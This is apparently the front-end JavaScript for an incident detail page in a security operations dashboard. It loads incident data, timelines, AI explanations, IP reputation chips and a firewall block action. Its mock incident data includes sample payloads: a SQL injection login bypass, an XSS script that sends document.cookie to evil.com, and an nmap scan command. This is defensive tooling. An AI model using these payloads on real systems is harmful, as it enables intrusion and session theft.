// ===== Reveal =====
const io = new IntersectionObserver((entries) => {
  entries.forEach(e => { if (e.isIntersecting){ e.target.classList.add('visible'); io.unobserve(e.target); }});
}, { threshold:.1 });
document.querySelectorAll('.reveal').forEach(el => io.observe(el));

// ===== Incident data (should match alerts list) =====
const INCIDENTS = {
  'INC-001': { type:'SQL Injection Attempt', sev:'critical', status:'active', src:'192.168.1.45', target:'10.0.0.50', proto:'TCP', port:'3306', asn:'AS15169', country:'Unknown', time:'2026-04-24 14:32:15', score:65, similar:12, mitre:{id:'T1190', name:'Exploit Public-Facing Application', tactic:'Initial Access'}, desc:'Multiple SQL injection attempts detected targeting the login endpoint. The attacker is trying to bypass authentication using common SQL injection patterns.', payload:`POST /api/login HTTP/1.1\nHost: example.com\nContent-Type: application/x-www-form-urlencoded\n\n<span class="hl">username=admin' OR '1'='1&password=anything</span>` },
  'INC-002': { type:'Brute Force Attack', sev:'high', status:'active', src:'10.0.0.123', target:'10.0.0.10', proto:'SSH', port:'22', asn:'AS7922', country:'US', time:'2026-04-24 14:17:42', score:72, similar:28, mitre:{id:'T1110', name:'Brute Force', tactic:'Credential Access'}, desc:'Repeated SSH authentication failures from a single source IP indicating automated password guessing.', payload:`ssh admin@10.0.0.10\nFailed password for admin from 10.0.0.123 port 54234 ssh2\nFailed password for admin from 10.0.0.123 port 54235 ssh2\n<span class="hl">[1,247 failed attempts in 15 minutes]</span>` },
  'INC-003': { type:'Suspicious File Upload', sev:'medium', status:'investigating', src:'172.16.0.88', target:'10.0.0.22', proto:'HTTPS', port:'443', asn:'AS16509', country:'DE', time:'2026-04-24 13:28:04', score:48, similar:5, mitre:{id:'T1105', name:'Ingress Tool Transfer', tactic:'Command and Control'}, desc:'A binary file with obfuscated content was uploaded through a public-facing form.', payload:`POST /upload HTTP/1.1\nContent-Type: multipart/form-data\n\n<span class="hl">filename="invoice.pdf.exe"</span>\nMZP\\x00\\x02\\x00\\x00\\x00\\x04...` },
  'INC-004': { type:'Port Scanning', sev:'low', status:'resolved', src:'192.168.1.99', target:'10.0.0.0/24', proto:'TCP', port:'multi', asn:'internal', country:'LAN', time:'2026-04-24 12:10:33', score:22, similar:3, mitre:{id:'T1046', name:'Network Service Discovery', tactic:'Discovery'}, desc:'Nmap stealth scan detected from internal subnet. Host profiled and logged.', payload:`nmap -sS -T4 10.0.0.0/24\n<span class="hl">Discovered open port 22/tcp on 10.0.0.10</span>\nDiscovered open port 80/tcp on 10.0.0.12` },
  'INC-005': { type:'XSS Attack Detected', sev:'critical', status:'active', src:'192.168.1.120', target:'10.0.0.50', proto:'HTTPS', port:'443', asn:'AS15169', country:'Unknown', time:'2026-04-24 11:32:15', score:78, similar:9, mitre:{id:'T1059', name:'Command and Scripting Interpreter', tactic:'Execution'}, desc:'Reflected XSS payload injected into the contact form input field.', payload:`POST /contact HTTP/1.1\n\nname=<span class="hl">&lt;script&gt;fetch('https://evil.com?c='+document.cookie)&lt;/script&gt;</span>` },
  'INC-006': { type:'Unauthorized Access Attempt', sev:'high', status:'investigating', src:'10.0.0.45', target:'10.0.0.5', proto:'HTTPS', port:'443', asn:'internal', country:'LAN', time:'2026-04-24 10:32:15', score:68, similar:14, mitre:{id:'T1078', name:'Valid Accounts', tactic:'Defense Evasion'}, desc:'Attempted privileged login outside normal working hours from an unusual source.', payload:`Login attempt: user=root time=03:12 AM\n<span class="hl">Geo anomaly: login from unexpected location</span>` },
  'INC-007': { type:'DDoS Attack Pattern', sev:'critical', status:'mitigated', src:'203.0.113.42', target:'10.0.0.1', proto:'UDP', port:'53', asn:'AS14061', country:'RU', time:'2026-04-24 09:32:15', score:92, similar:4, mitre:{id:'T1498', name:'Network Denial of Service', tactic:'Impact'}, desc:'Volumetric flood mitigated at the edge — peaked at 12K req/s.', payload:`<span class="hl">12,432 req/s sustained from distributed sources</span>\nRate limit triggered — edge mitigation engaged` },
  'INC-008': { type:'Malware Detection', sev:'high', status:'quarantined', src:'172.16.0.200', target:'10.0.0.50', proto:'TCP', port:'445', asn:'AS16509', country:'DE', time:'2026-04-24 08:32:15', score:81, similar:7, mitre:{id:'T1204', name:'User Execution', tactic:'Execution'}, desc:'Signature match on a sample — file isolated in sandbox for analysis.', payload:`File: <span class="hl">update_installer.exe</span>\nSHA256: 8f4e2a91...\nVerdict: Trojan.Generic.KD.47283` },
  'INC-009': { type:'Phishing Attempt', sev:'medium', status:'blocked', src:'198.51.100.88', target:'mail.corp', proto:'SMTP', port:'25', asn:'AS13335', country:'US', time:'2026-04-24 07:32:15', score:52, similar:19, mitre:{id:'T1566', name:'Phishing', tactic:'Initial Access'}, desc:'Spoofed sender with credential-harvesting link intercepted and quarantined.', payload:`From: <span class="hl">no-reply@micros0ft.com</span>\nSubject: Urgent: Your password expires today\nLink: https://secure-login.ru/o365` },
  'INC-010': { type:'Data Exfiltration', sev:'critical', status:'active', src:'192.168.1.156', target:'185.22.4.10', proto:'HTTPS', port:'443', asn:'external', country:'RU', time:'2026-04-24 06:32:15', score:88, similar:2, mitre:{id:'T1041', name:'Exfiltration Over C2 Channel', tactic:'Exfiltration'}, desc:'Unusual outbound traffic volume to an external IP detected.', payload:`<span class="hl">4.2 GB uploaded to 185.22.4.10 in 12 minutes</span>\nDestination: known C2 infrastructure` },
};

// ===== Load incident from URL =====
const params = new URLSearchParams(location.search);
const id = params.get('id') || 'INC-001';
const inc = INCIDENTS[id] || INCIDENTS['INC-001'];

// Populate
document.getElementById('incId').textContent = id;
const sevEl = document.getElementById('incSev');
sevEl.textContent = inc.sev.toUpperCase();
sevEl.className = 'badge-sev ' + inc.sev;
const statEl = document.getElementById('incStatus');
statEl.textContent = inc.status;
statEl.className = 'status-pill ' + inc.status;
document.getElementById('incType').textContent = inc.type;

document.getElementById('dTime').textContent = inc.time;
const dStat = document.getElementById('dStatus');
dStat.textContent = inc.status;
dStat.className = 'status-pill ' + inc.status;
document.getElementById('dSrc').textContent = inc.src;
document.getElementById('dTarget').textContent = inc.target;
document.getElementById('dProto').textContent = inc.proto;
document.getElementById('dPort').textContent = inc.port;
document.getElementById('dAsn').textContent = inc.asn;
document.getElementById('dCountry').textContent = inc.country;
document.getElementById('dDesc').textContent = inc.desc;
const payloadEl = document.getElementById('payload');
if (payloadEl) payloadEl.textContent = stripMarkup(inc.payload || '—');
renderAiExplanation(null, inc.type);
renderTimeline(getStaticTimeline());

// Threat intel
const tiBar = document.getElementById('tiBar');
const tiVal = document.getElementById('tiVal');
tiBar.style.width = inc.score + '%';
tiVal.innerHTML = `<span id="tiNum">0</span><span class="ti-max">/100</span>`;
animateNum(document.getElementById('tiNum'), inc.score, 1200);
document.getElementById('simCount').textContent = '0';
animateNum(document.getElementById('simCount'), inc.similar, 1000);

// MITRE
document.querySelector('.mt-id').textContent = inc.mitre.id;
document.querySelector('.mt-name').textContent = inc.mitre.name;
document.querySelector('.mitre-tag .muted.sm').textContent = inc.mitre.tactic;

// Document title
document.title = `${id} · ${inc.type} — MADRS`;

// ===== Helpers =====
function animateNum(el, target, dur){
  const start = performance.now();
  const isFloat = target % 1 !== 0;
  function tick(now){
    const p = Math.min((now - start) / dur, 1);
    const e = 1 - Math.pow(1 - p, 3);
    const v = target * e;
    el.textContent = isFloat ? v.toFixed(1) : Math.floor(v);
    if (p < 1) requestAnimationFrame(tick);
  }
  requestAnimationFrame(tick);
}

function renderTimeline(events){
  const host = document.getElementById('timeline');
  if (!host) return;
  if (!events.length) {
    host.innerHTML = `<li class="timeline-empty">لا توجد أحداث مسجلة لمسار هذا التنبيه بعد.</li>`;
    return;
  }
  host.innerHTML = events.map((evt, i) => {
    const color = evt.color || '';
    const tag = evt.tag || 'info';
    return `
      <li class="tl-item ${color}" style="animation-delay:${i * 0.06}s">
        <span class="tl-time">${evt.time || '—'}</span>
        <span class="tl-text">${evt.text || ''}</span>
        <span class="tl-tag ${tag}">${(evt.tag_label || tag).toUpperCase()}</span>
      </li>`;
  }).join('');
}

function getStaticTimeline(){
  return [
    { time:'14:32:12', text:'التقاط تدفق الشبكة بواسطة المستشعر', tag:'info' },
    { time:'14:32:13', text:'تحويل التدفّق إلى ميزات وتحليلها بالذكاء الاصطناعي', tag:'info' },
    { time:'14:32:14', text:'النموذج صنّف النشاط كهجوم عالي الخطورة', tag:'critical', color:'red' },
    { time:'14:32:15', text:'تطبيق قاعدة الحماية (WAF / Firewall)', tag:'warning', color:'yellow' },
    { time:'14:32:16', text:'توليد التنبيه وربطه بالحادث الحالي', tag:'critical', color:'red' },
    { time:'14:32:18', text:'إرسال إشعارات SOC وتحديث لوحة المعلومات', tag:'success', color:'green' },
  ];
}

function renderTimelineFromBackend(trace, createdAt, attackType){
  if (!Array.isArray(trace) || !trace.length) {
    const base = buildTimelineFromBase(createdAt, attackType);
    renderTimeline(base);
    return;
  }
  const events = trace.map((step, idx) => ({
    time: step.timestamp ? new Date(step.timestamp).toLocaleTimeString() : `+${idx}s`,
    text: step.description || step.stage || '—',
    tag: mapStageToTag(step.stage),
    color: mapStageToColor(step.stage),
    tag_label: localizedStage(step.stage, step.status),
  }));
  renderTimeline(events);
}

function buildTimelineFromBase(createdAt, attackType){
  const baseTime = createdAt ? new Date(createdAt) : new Date();
  const fmt = (offsetMs) => new Date(baseTime.getTime() + offsetMs).toLocaleTimeString();
  return [
    { time: fmt(0),     text: `${attackType || 'الهجوم'} بدأ من المصدر`, tag:'info' },
    { time: fmt(1000),  text: 'تم تحليل التدفّق بواسطة الذكاء الاصطناعي', tag:'info' },
    { time: fmt(2000),  text: 'تم تأكيد توقيع الهجوم وتحديد الشدة', tag:'critical', color:'red' },
    { time: fmt(3000),  text: 'تطبيق سياسات الدفاع المسبق (WAF/IPS)', tag:'warning', color:'yellow' },
    { time: fmt(4000),  text: 'توليد التنبيه وربطه بالحادث', tag:'critical', color:'red' },
    { time: fmt(5000),  text: 'إخطار فريق العمليات وتسجيل الحدث', tag:'success', color:'green' },
  ];
}

function mapStageToTag(stage){
  if (!stage) return 'info';
  const s = stage.toLowerCase();
  if (s.includes('detected') || s.includes('classified')) return 'critical';
  if (s.includes('mitigation') || s.includes('firewall')) return 'warning';
  if (s.includes('notified') || s.includes('resolved')) return 'success';
  return 'info';
}

function mapStageToColor(stage){
  const tag = mapStageToTag(stage);
  return tag === 'critical' ? 'red' : tag === 'warning' ? 'yellow' : tag === 'success' ? 'green' : '';
}

function localizedStage(stage, status){
  if (!stage) return status || 'INFO';
  const s = stage.toLowerCase();
  if (s.includes('ingest')) return 'INGEST';
  if (s.includes('classify')) return 'CLASSIFY';
  if (s.includes('mitigation')) return 'DEFENSE';
  if (s.includes('notify')) return 'NOTIFY';
  if (s.includes('resolve')) return 'RESOLVE';
  return stage.toUpperCase();
}

function renderPayloadPreview(explanation, attackType){
  const host = document.getElementById('payload');
  if (!host) return;

  let parsed;
  if (explanation) {
    try { parsed = typeof explanation === 'string' ? JSON.parse(explanation) : explanation; }
    catch { parsed = null; }
  }

  const sample = parsed && typeof parsed === 'object' ? parsed.payload_sample : null;
  if (sample && (sample.ascii || sample.hex)) {
    const ascii = (sample.ascii || '').trim();
    const hex = (sample.hex || '').trim();
    const size = sample.size_bytes;
    const note = sample.note;
    const meta = [];
    if (size) meta.push(`${size} bytes captured`);
    if (sample.preview_bytes && size && sample.preview_bytes < size) {
      meta.push(`showing first ${sample.preview_bytes} bytes`);
    }
    if (note) meta.push(note);

    if (ascii) {
      host.textContent = ascii;
    } else if (hex) {
      host.textContent = formatHex(hex);
    } else {
      host.textContent = '—';
    }

    if (meta.length) {
      host.textContent += `\n\n# ${meta.join(' — ')}`;
    }
    return;
  }

  if (parsed && typeof parsed === 'object') {
    const summary = parsed.summary || null;
    const details = Array.isArray(parsed.details) ? parsed.details.filter(Boolean) : [];
    const lines = [];
    if (summary) lines.push(summary);
    if (details.length) {
      lines.push('', ...details.map((d, i) => `${i + 1}. ${d}`));
    }
    if (lines.length) {
      host.textContent = lines.join('\n');
      return;
    }
  }

  const fallback = attackType ? `No captured payload available for ${attackType}.` : 'No captured payload available.';
  host.textContent = fallback;
}

function renderAiExplanation(explanation, attackType){
  const summaryEl = document.getElementById('expSummary');
  const detailsEl = document.getElementById('expDetails');
  const signalsEl = document.getElementById('expSignals');
  const emptyEl = document.getElementById('expEmpty');
  if (!summaryEl || !detailsEl || !signalsEl || !emptyEl) return;

  let parsed;
  if (explanation) {
    try { parsed = typeof explanation === 'string' ? JSON.parse(explanation) : explanation; }
    catch { parsed = null; }
  }

  const summary = parsed?.summary || buildFallbackSummary(attackType);
  const details = Array.isArray(parsed?.details) ? parsed.details.filter(Boolean) : [];
  const features = Array.isArray(parsed?.top_features) ? parsed.top_features : [];

  summaryEl.textContent = summary || 'تم اكتشاف نشاط مشبوه من قبل النظام.';
  detailsEl.innerHTML = '';
  signalsEl.innerHTML = '';

  if (details.length) {
    details.forEach((line) => {
      const li = document.createElement('li');
      li.textContent = line;
      detailsEl.appendChild(li);
    });
  }

  if (features.length) {
    features.slice(0, 4).forEach((feat) => {
      const chip = document.createElement('div');
      chip.className = 'exp-chip';
      const title = document.createElement('strong');
      title.textContent = localizedFeature(feat.feature || 'ميزة');
      const meta = document.createElement('span');
      const value = feat.value != null ? feat.value : '—';
      const impact = feat.impact != null ? Number(feat.impact).toFixed(2) : null;
      meta.textContent = impact ? `القيمة: ${value} · الأثر: ${impact}` : `القيمة: ${value}`;
      chip.appendChild(title);
      chip.appendChild(meta);
      signalsEl.appendChild(chip);
    });
  }

  const hasContent = (summary && summary !== '—') || details.length || features.length;
  emptyEl.style.display = hasContent ? 'none' : '';
  detailsEl.style.display = details.length ? '' : 'none';
  signalsEl.style.display = features.length ? '' : 'none';
}

function buildFallbackSummary(attackType){
  if (!attackType) return '';
  const map = {
    'ICMP Flood': 'تم رصد عدد كبير من رسائل ICMP المتتابعة مما يشير إلى هجوم إغراق.',
    'Port Scan': 'تم اكتشاف محاولات مسح منافذ متتالية من نفس المصدر.',
    'SQL Injection': 'تم ملاحظة أنماط استعلامات تسبب حقن SQL داخل الطلبات.',
    'Web Attack': 'اكتشف النظام شذوذًا في حركة الويب يشير إلى هجوم تطبيقات.',
    'DDoS': 'الكثافة العالية للاتصالات المتزامنة تلمّح إلى هجوم حرمان من الخدمة.',
    'Brute Force': 'تكرار محاولات الدخول بكلمات مرور مختلفة يوحي بهجوم تخمين.',
  };
  return map[attackType] || `تم تصنيف النشاط كهجوم ${attackType}.`;
}

function localizedFeature(name){
  if (!name) return 'ميزة';
  const map = {
    'Total Fwd Packets': 'إجمالي الحزم الصادرة',
    'Total Backward Packets': 'إجمالي الحزم الواردة',
    'Flow Duration': 'زمن التدفّق',
    'Fwd Packet Length Mean': 'متوسط حجم الحزم الصادرة',
    'Bwd Packet Length Mean': 'متوسط حجم الحزم الواردة',
    'Packet Length Variance': 'تباين حجم الحزم',
  };
  return map[name] || name;
}

function formatHex(hex){
  if (!hex) return '';
  return hex.match(/.{1,32}/g)?.join('\n') || hex;
}

// ===== Copy actions =====
const toast = document.getElementById('toast');
function showToast(msg = 'Copied to clipboard'){
  toast.querySelector('span').textContent = msg;
  toast.classList.add('show');
  clearTimeout(showToast._t);
  showToast._t = setTimeout(() => toast.classList.remove('show'), 1800);
}

function stripMarkup(str){
  if (!str) return '';
  const tmp = document.createElement('div');
  tmp.innerHTML = str;
  return tmp.textContent || tmp.innerText || '';
}
document.querySelectorAll('.copy').forEach(el => {
  el.addEventListener('click', () => {
    navigator.clipboard.writeText(el.textContent.trim()).then(() => showToast());
  });
});
document.getElementById('copyPayload').addEventListener('click', () => {
  const node = document.getElementById('payload');
  const txt = node ? node.textContent || '' : '';
  navigator.clipboard.writeText(txt.trim()).then(() => showToast('Payload copied'));
});

// ===== Action buttons =====
document.querySelector('.btn-action.analyze')?.addEventListener('click', () => { window.location.href = 'analysis.html?id=' + id; });
document.querySelector('.btn-action.respond')?.addEventListener('click', () => { window.location.href = 'response.html?id=' + id; });
document.querySelectorAll('.qa-btn').forEach(b => {
  b.addEventListener('click', async () => {
    if (b.id === 'qaBlockIp') return; // dedicated handler below
    const t = b.querySelector('.qa-t').textContent;
    if (t === 'AI Classification'){ window.location.href = 'classification.html?id=' + id; return; }
    if (t === 'MITRE ATT&CK'){ window.location.href = 'mitre.html?id=' + id; return; }
    if (t === 'Export Report') {
      if (!window.AisecAPI) { showToast('API unavailable'); return; }
      const idParam = (new URLSearchParams(location.search)).get('id');
      const mId = idParam?.match(/(\d+)/);
      const alertId = mId ? parseInt(mId[1]) : null;
      if (!alertId) { showToast('Unable to determine incident'); return; }
      try {
        const { name } = await AisecAPI.downloadAnalysisReport(alertId);
        showToast(`Analysis downloaded: ${name}`);
      } catch (err) {
        const msg = err?.status === 401 ? 'Session expired — please log in again'
                  : 'Export failed: ' + (err?.message || 'unknown error');
        showToast(msg);
      }
      return;
    }
    showToast(t + ' triggered');
  });
});

// ===== Block Source IP =====
document.getElementById('qaBlockIp')?.addEventListener('click', async () => {
  const srcEl = document.getElementById('dSrc');
  // Prefer the raw IP stashed when the alert loaded — textContent may include
  // the trailing reputation chip text (e.g. "1.2.3.4US 99").
  const ip = (srcEl?.dataset?.ip || srcEl?.textContent || '').trim();
  if (!ip || ip === '—') { showToast('No source IP to block'); return; }
  if (!window.AisecAPI?.isAuthenticated?.()) { showToast('Login required'); return; }

  const reason = window.prompt(
      `Block ${ip} at the firewall?\n\nOptional: enter a reason (or leave blank).`,
      `Manual block from incident ${document.getElementById('incId').textContent}`);
  if (reason === null) return;  // user cancelled

  // Try to extract numeric alert id from the page id (e.g. INC-007 → 7)
  let sourceAlertId = null;
  const m = (new URLSearchParams(location.search)).get('id')?.match(/(\d+)/);
  if (m) sourceAlertId = parseInt(m[1]);

  try {
    const res = await AisecAPI.blockIp({ ip, reason, sourceAlertId });
    const ra = res.resolved_alerts || 0;
    const ri = res.resolved_incidents || 0;
    let msg = `✓ ${res.ip} blocked`;
    if (ra || ri) msg += ` — resolved ${ra} alert${ra === 1 ? '' : 's'}`
                       + (ri ? ` & ${ri} incident${ri === 1 ? '' : 's'}` : '');
    showToast(msg);
    // Reflect the resolution in the page chrome so the analyst sees the fix
    // without having to refresh.
    const dStat = document.getElementById('dStatus');
    const incStat = document.getElementById('incStatus');
    if (ra > 0) {
      if (dStat)   { dStat.textContent   = 'resolved'; dStat.className = 'status-pill resolved'; }
      if (incStat) { incStat.textContent = 'resolved'; incStat.className = 'status-pill resolved'; }
    }
  } catch (err) {
    showToast('Block failed: ' + (err.message || 'unknown error'));
  }
});

// Render a small reputation chip after the source IP cell. Uses the same
//0-100 score colour scheme as the firewall page; clicking it forces a fresh
// upstream lookup. Inserted lazily so missing data never blocks the page.
async function renderSourceIpReputation(ip) {
  const host = document.getElementById('dSrc');
  if (!host) return;
  if (host.dataset.repIp === ip) return; // already rendered
  host.dataset.repIp = ip;

  // Don't pollute the layout with an inline pill on private/loopback IPs.
  if (/^(10\.|192\.168\.|172\.(1[6-9]|2\d|3[01])\.|127\.|169\.254\.|::1$)/.test(ip)) return;

  // Re-use the same chip the firewall page uses. Ensure the badge CSS is
  // available in case incident.html doesn't already include it.
  ensureRepStyles();

  const chip = document.createElement('span');
  chip.className = 'rep-badge rep-unknown';
  chip.style.marginLeft = '10px';
  chip.textContent = '…';
  chip.title = 'Querying threat intelligence…';
  host.appendChild(chip);

  try {
    const rep = await AisecAPI.lookupReputation(ip);
    if (!rep) { chip.className = 'rep-badge rep-unknown'; chip.textContent = 'unknown'; return; }
    const s = Number(rep.abuse_score || 0);
    chip.className = 'rep-badge ' + (s >= 75 ? 'rep-bad' : s >= 25 ? 'rep-warn' : 'rep-good');
    chip.textContent = (rep.country_code ? rep.country_code + ' ' : '') + s;
    chip.title = [
      `Abuse score: ${s}/100`,
      rep.country ? 'Country: ' + rep.country : null,
      rep.isp ? 'ISP: ' + rep.isp : null,
      rep.total_reports ? 'Reports: ' + rep.total_reports : null,
      rep.provider ? 'via ' + rep.provider : null,
    ].filter(Boolean).join('\n');
  } catch (e) {
    chip.className = 'rep-badge rep-unknown';
    chip.textContent = 'n/a';
    chip.title = 'Lookup failed: ' + (e.message || 'unknown');
  }
}

function ensureRepStyles() {
  if (document.getElementById('rep-badge-styles')) return;
  const s = document.createElement('style');
  s.id = 'rep-badge-styles';
  s.textContent = `
    .rep-badge{display:inline-flex;align-items:center;gap:4px;padding:2px 8px;border-radius:10px;font-size:10px;font-weight:700;font-family:'JetBrains Mono',monospace;border:1px solid transparent;vertical-align:middle}
    .rep-good   {background:rgba(34,197,94,.12); color:#86efac; border-color:rgba(34,197,94,.3)}
    .rep-warn   {background:rgba(251,191,36,.12);color:#fcd34d; border-color:rgba(251,191,36,.3)}
    .rep-bad    {background:rgba(239,68,68,.15); color:#fca5a5; border-color:rgba(239,68,68,.4)}
    .rep-unknown{background:#0f1d33;color:#8ea0b8;border-color:#1e3557}
  `;
  document.head.appendChild(s);
}

// ===== Backend integration: load real incident if ID is numeric =====
(async function loadFromBackend(){
  if (!window.AisecAPI) return;
  if (!AisecAPI.requireAuth()) return;
  // Use numeric portion of id, e.g. "INC-007" -> 7, or plain "7"
  const raw = (new URLSearchParams(location.search)).get('id') || '';
  const m = raw.match(/(\d+)/);
  if (!m) return;
  const numId = parseInt(m[1]);

  try {
    const a = await AisecAPI.getAlert(numId);
    // Override page DOM with real backend data
    const idStr = 'INC-' + String(a.id).padStart(3, '0');
    document.getElementById('incId').textContent = idStr;
    document.getElementById('incType').textContent = a.attack_type || 'Unknown';

    const sev = (a.severity || 'INFORMATIONAL').toLowerCase();
    const sevEl = document.getElementById('incSev');
    sevEl.textContent = (a.severity || '').toUpperCase();
    sevEl.className = 'badge-sev ' + sev;

    const status = (a.status || 'NEW').toLowerCase().replace('_', ' ');
    const statEl = document.getElementById('incStatus');
    statEl.textContent = status;
    statEl.className = 'status-pill ' + status.split(' ')[0];

    const dStat = document.getElementById('dStatus');
    if (dStat) { dStat.textContent = status; dStat.className = 'status-pill ' + status.split(' ')[0]; }

    const set = (id, v) => { const el = document.getElementById(id); if (el && v != null) el.textContent = v; };
    set('dTime',    new Date(a.created_at).toLocaleString());
    set('dSrc',     a.source_ip || '—');
    // Stash the raw IP for the Block button — its textContent gets polluted
    // by the reputation chip appended below.
    const dSrcEl = document.getElementById('dSrc');
    if (dSrcEl && a.source_ip) dSrcEl.dataset.ip = a.source_ip;
    set('dTarget',  a.dest_ip   || '—');
    set('dProto',   a.protocol  || '—');
    set('dPort',    a.dest_port || '—');
    set('dDesc',    a.description || 'No description available.');

    renderPayloadPreview(a.explanation, a.attack_type);
    renderAiExplanation(a.explanation, a.attack_type);
    renderTimelineFromBackend(a.alert_trace || [], a.created_at, a.attack_type);

    // Fire-and-forget reputation enrichment for the source IP. Renders a
    // coloured pill inline next to dSrc once the verdict comes back so the
    // analyst can decide whether to block before clicking the button.
    if (a.source_ip) {
        renderSourceIpReputation(a.source_ip).catch(() => {/* non-fatal */});
    }

    // MITRE
    const mtId   = document.querySelector('.mt-id');
    const mtName = document.querySelector('.mt-name');
    const mtTactic = document.querySelector('.mitre-tag .muted.sm');
    if (mtId)     mtId.textContent     = a.mitre_technique || '—';
    if (mtName)   mtName.textContent   = a.attack_type || '';
    if (mtTactic) mtTactic.textContent = a.mitre_tactic || '—';

    // Threat score from confidence
    const score = Math.round((a.confidence || 0) * 100);
    const tiBar = document.getElementById('tiBar');
    const tiVal = document.getElementById('tiVal');
    if (tiBar) tiBar.style.width = score + '%';
    if (tiVal) tiVal.innerHTML   = score + '<span class="ti-max">/100</span>';

    document.title = `${idStr} · ${a.attack_type} — MADRS`;

    // Wire the "Mark Resolved" / Respond buttons to backend
    const respondBtn = document.querySelector('.btn-action.respond');
    respondBtn?.addEventListener('click', async (e) => {
      e.preventDefault();
      try {
        await AisecAPI.updateAlert(a.id, 'RESOLVED');
        showToast('Alert marked as RESOLVED');
        setTimeout(() => location.reload(), 800);
      } catch (err) { showToast('Update failed: ' + err.message); }
    });
  } catch (err) {
    console.warn('Could not load incident from backend:', err.message);
    // Fall back to static INCIDENTS map (already populated above)
  }
})();
